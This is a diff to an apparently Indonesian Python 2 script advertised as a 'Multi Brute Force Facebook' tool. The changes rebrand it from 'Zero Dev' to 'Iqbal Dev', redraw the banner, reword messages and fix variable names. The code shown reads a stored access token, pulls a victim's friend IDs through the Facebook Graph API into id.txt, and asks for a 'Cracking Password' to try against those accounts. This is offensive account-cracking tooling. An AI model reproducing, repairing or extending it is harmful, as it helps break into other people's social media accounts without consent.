@@ -1,7 +1,7 @@
-# Created by Zero Dev
-# Tools FBx Versi Ke6
+# Created by Iqbal Dev
+# Tools Multi Brute Force Facebook Ringan
 #=============================================
-# SELAA CHAN. PUNYA GW YA INGET JANGAN NIKUNG
+# J A N G A N   D I   R E C O D E.  N J I N G 
 #=============================================
 
 import os 
@@ -49,18 +49,18 @@ def banner():
     clear()
     ival ('''\ra
                
-                _____ ____
-               | ____| __ \        \rw
-               | |__|_    |        \ra  
-               | ____|   < \ /
-               | |  | _-_ | x
-               |_|  |_____// \
+             _____ __.    _____ 
+            /     \\_ |___/ ____/  \rw
+           /  \ /  \| __ \   __\   \ra  
+          /    Y    \ \_\ \  |   
+          \____|__  /___  /__|   
+                  \/    \/       
      \rw+==============================+
-     \ra|            FBxV6             |
+     \ra|       MULTI BRUTE FORCE      |
      \rw+==============================+ 
         \rd==========================
-         \rp[ \rwCreated by \raZero Dev\rp ]
-         \rp[ \rwCreated by \raZalasXa/\rp ]
+         \rp[ \rwCreated by \raIqbal Dev\rp ]
+         \rp[ \rwThanks to \raIvana Raa/\rp ]
         \rd==========================''')
 
 def logout():
@@ -73,10 +73,10 @@ def logout():
             print d+" Keluar Dari Program.."
         elif iqbal == "2":
             print k+ " Keluar Dari Akun Fb..."
-            print h+ " Anda Harus Login Fb kembali.."
+            print h+ " Anda Harus Login Fb Lagi.."
             os.system("rm -f token.txt") 
         else:
-            print m+ "Pilihan Tidak ada.."
+            print m+ "Pilih yg Bener Cuk.."
             logout()
             
     except KeyboardInterrupt:
@@ -145,7 +145,7 @@ def id_teman():
             print a+"\n  ID Tersimpan " + p + "(" + pu + "id.txt" + p + ")" 
             print 
             iqbal = requests.get("https://graph.facebook.com/me?access_token=" + token)
-            dev = json.loads(CP.txt)
+            dev = json.loads(iqbal.text)
             nama = dev["name"]
             print (h+" [ "+p+"Lanjutkan " + pu + nama +h+" ]\n")
             raw_input(k+ " => ")
@@ -173,17 +173,17 @@ def mbf():
         try:
             token = open("token.txt", "r").read()
             iqbal_name = requests.get("https://graph.facebook.com/me?access_token=" + token)
-            dev = json.loads(zero_name.txt)
+            dev = json.loads(iqbal_name.text)
             nama = dev['name']
             print h+"  []" + a + " Selamat Datang " + pu + nama + "\033[92m :)"
             print d+"  ======================================"
-            password = raw_input(h+"  [" +k+ "FBx" +h+ "]" + a + " Cracking Password" + p + ": ")
+            password = raw_input(h+"  [" +k+ "MBF" +h+ "]" + a + " Cracking Password" + p + ": ")
             if password == "":
-                print m+" Isi Dengan Benar.."
+                print m+" Jangan Kosong Cuk.."
                 sys.exit()
                 
             if password == " ":
-                print m+" Isi Dengan Benar.."
+                print m+" Jangan Kosong Cuk.."
                 sys.exit()
                 
             print
@@ -212,9 +212,9 @@ def mbf():
             os.system("rm -f token.txt")
             print
             
-def zerodevmbf():
+def iqbaldevmbf():
     
-    global count, Venom, gagal, oradadi, baris
+    global count, dados1, gagal, oradadi, baris
     
     try:
         data_lis = open('id.txt', "r")
@@ -252,8 +252,8 @@ def zerodevmbf():
 def sel():
     print 
     print 
-    for Zero in Venom:
-        print Zero
+    for iqbal in dados1:
+        print iqbal
     for dev in gagal:
         print dev
     print
